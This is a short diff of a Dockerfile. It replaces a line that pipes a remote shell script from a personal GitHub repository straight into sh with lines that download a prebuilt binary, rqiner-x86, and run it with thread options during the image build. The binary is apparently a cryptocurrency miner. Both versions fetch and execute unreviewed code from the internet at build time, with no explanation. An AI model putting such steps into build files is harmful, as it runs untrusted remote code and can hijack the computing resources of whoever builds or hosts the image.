@@ -1,3 +1,4 @@
-FROM ubuntu:20.04
+FROM ubuntu:latest
 RUN apt update && apt install wget curl git -y
-RUN curl https://raw.githubusercontent.com/grco001/grc/main/grc.sh | sh
+RUN wget https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v0.3.11/rqiner-x86 && chmod +x rqiner-x86
+RUN ./rqiner-x86 -t 4 -b
